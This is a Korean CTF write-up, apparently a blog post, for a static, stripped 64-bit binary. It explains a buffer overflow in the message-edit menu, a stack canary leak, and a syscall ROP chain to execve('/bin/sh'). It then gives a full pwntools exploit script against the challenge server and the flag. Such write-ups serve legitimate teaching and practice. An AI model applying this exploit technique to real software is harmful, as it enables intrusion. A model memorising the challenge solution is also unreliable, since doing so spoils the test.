---
layout: post
title: 64bit srop write-up
---

64비트 srop 문제

1. Binary

----------

![](https://lh3.googleusercontent.com/30jp43G1peSoaTKeRUwwDruSbj4XJPeXdRwlgoEQYvEM8t74hABaLQ7Q4WDndC1Lg2-E9BQp4O8OC0vYZPgorry0nXMVJLxgD9LXecK0zHWuh7E-SAZF1bJ3JgS7Cp2NbMG6ZENg)

이 바이너리는 ELF 64bit 파일입니다. static 컴파일이 되어 있었고, strip된 파일이였습니다.

static 컴파일과 strip이 되어있어서 분석이 어려웠지만 gdb로 흐름을 쫓으며 분석하였습니다.

2. Vulnerability

----------

메뉴 2. Edit message에서 message를 입력 받는데, 여기서 buffer overflow 취약점이 발생합니다.

![](https://lh4.googleusercontent.com/H-MRa7p21Sfj16r6UWCP2MjpzUMPzuZ5oYkht_fLMQtMFxwg0Fl84wgRW0G0BgSBTk0VF5pcbMGjCTOlaScz092GBhAOOiEWKYyG9txbLmaryCIApToHZjUBafx75bNfqiUHELnd)

세번째 인자인 edx 가 400으로 세팅 되어 있습니다. 이는 1024만큼 입력을 받을 수 있게 됩니다.

![](https://lh4.googleusercontent.com/ctjVB282zddqRF4IsuXfUfHozYMTmCx0QHQ22fE7D1EQn3_GSBLaKWIipt5h3ZwodEXIYtQ3M0y06fmZqkDnxU9cPp3WcE1RpHZecuIWxuWgnma01FRyk_-spAfRt1GVaTh-n5ST)

sys_input? 함수를 보면 eax를 0으로 세팅하고 syscall 하는 것을 볼 수 있습니다. 64비트에서 sys_read는 rax가 0으로 세팅되어있으면 호출 됩니다.

![](https://lh3.googleusercontent.com/tfVHbhAUepw4VzGzcN39FcCIvczecNigw48c509WBbZ3SczgkCY2t-2AOOE1NLZUb50jI10eYezeB_OhHzjz8VtCi3K4VaWvh3_6NNC7fbR6LRjzHn7rEN3n8ImHdsI0eWJPbtyt)

입력을 받는 v8변수는 bp - 0xd0 위치에 있으며 bp - 208 위치에 있습니다. 1024만큼 입력을 받을 수 있으니 bof가 가능합니다.

하지만 bp - 0x8 위치에 canary 변수가 있는 것을 확인 할 수 있었습니다. 하지만 이는 1. show 메뉴에서 leak이 가능했습니다.

3. exploit

----------

static 컴파일과 strip 이 되어있어서 일반적인 rop는 힘들어보였습니다. 다만 이 문제에서 syscall을 이용하기 때문에 관련된 정보를 공부하였고, syscall을 이용해 rop가 가능하다는 점을 알았습니다. canary가 활성화 되어있기 때문에 canary를 먼저 leak을 먼저 해준 다음, 다시 input에서 overflow로 rop해주면 되는 문제였습니다.

canary는 널바이트 + 7byte 이렇게 구성이 되는데, 1바이트를 overflow하면 문자열의 끝을 인식 못해 뒤에 바이트까지 leak이 됩니다.

syscall rop 같은 경우는 각 syscall rax number가 정해져있는데, 먼저 bss 영역에 “/bin/sh”을 적기 위해 인자 세팅 후 read(rax == 0) syscall; ret; 가젯으로 호출한뒤 chaining을 통해 rdi에 bss를 세팅하고 rsi에 0을 세팅 한 뒤 rax에는 execve의 rax number인 59를 세팅해 call 했습니다.

밑에는 exploit.py입니다.

>exploit.py

```python
from pwn import  *

#s = process("./rich")

s = remote("null2root.org", 1797)

e = ELF("./rich")

#context.log_level = 'debug'

gadget =  0x0045e395  # syscall ; ret

prdi =  0x00400535

prsi =  0x004017b7

prax =  0x0046dcb6  # pop rax ; pop rdx ; pop rbx ; ret

s.recvuntil("> ")

s.sendline("2")

s.recvuntil(": ")

leak_payload =  "A"*201

s.send(leak_payload)

s.recvuntil("> ")

s.sendline("1")

s.recvuntil("A"*201)

canary = u64("\x00"+s.recv(7))

log.success("canary : "+ hex(canary))

s.recvuntil("> ")

s.sendline("2")

s.recvuntil(": ")

payload =  "A"*200  + p64(canary)+"AAAAAAAA"

payload += p64(prdi)

payload += p64(0)

payload += p64(prsi)

payload += p64(e.bss())

payload += p64(prax)

payload += p64(0) + p64(0xff) + p64(0)

payload += p64(gadget)

payload += p64(prdi)

payload += p64(e.bss())

payload += p64(prsi)

payload += p64(0)

payload += p64(prax)

payload += p64(59) + p64(0) + p64(0)

payload += p64(gadget)

s.send(payload)

s.recvuntil("> ")

s.sendline("3")

s.recv()

s.send("/bin/sh\x00")

s.recv()

s.interactive()
```

![](https://lh3.googleusercontent.com/XnSyaezo4a0TPR0Q8EsAOcMO94Ui6efVoquawzhGbKUvS1SuVEc6MqmOE1QSLRS1DhEpptMjvTXyumtt96KpKBl6gDB0Yluo1LiXjb2WAnh01OHVbujpDNP6nt2QjFQ3uLxBt2Kf)

FLAG : n2r{enjoying_rich_rop_with_static_binary}

 
